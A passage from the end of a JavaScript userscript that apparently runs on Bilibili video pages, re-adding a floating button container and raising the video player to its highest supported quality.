  }
  setInterval(() => {
    if (location.pathname.startsWith('/video') && !document.getElementById('bili-fab-container')) {
      tries = 0; tick();
    }
  }, 2000);

  setInterval(updateFabVisibility, 500);

  if (location.pathname.startsWith('/video')) {
    setTimeout(function tick() {
      const p = getPlayer();
      if (p?.isInitialized?.()) {
        const list = p.getSupportedQualityList?.() || [];
        const max = Math.max(...list);
        if (max > 80 && (p.getQuality?.().nowQ || 0) < max) {
          try { p.requestQuality?.(max); } catch (_) {}
        }
      }
      setTimeout(tick, 3000);
    }, 3000);
  }
})();